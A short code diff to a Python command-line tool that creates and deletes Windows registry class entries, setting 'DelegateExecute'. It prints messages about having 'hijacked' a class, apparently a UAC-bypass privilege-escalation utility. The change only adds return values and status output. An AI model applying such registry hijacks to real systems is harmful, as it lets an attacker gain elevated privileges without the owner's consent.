@@ -35,6 +35,7 @@ class registry:
 			if DelegateExecute:
 					winreg.SetValueEx(self.key, "DelegateExecute", 0, winreg.REG_SZ, None)
 			winreg.CloseKey(self.key)
+		return True
 
 	""" Dirty cleans the class """
 	def delete(self, type):
@@ -49,6 +50,12 @@ class registry:
 
 if __name__ == "__main__":
 	if args.c:
-		registry().create(args.t[0], args.v[0], args.d[0])
+		if registry().create(args.t[0], args.v[0], args.d[0]):
+			print("Successfully hijacked class {type}".format(type=str(args.t[0])))
+		else:
+			print("Unable to hijack class {type}".format(type=str(args.t[0])))
 	if args.r:
-		registry().delete(str(args.t[0]))
+		if registry().delete(str(args.t[0])):
+			print("Successfully deleted class {type}".format(type=str(args.t[0])))
+		else:
+			print("Unable to delete class {type}".format(type=str(args.t[0])))
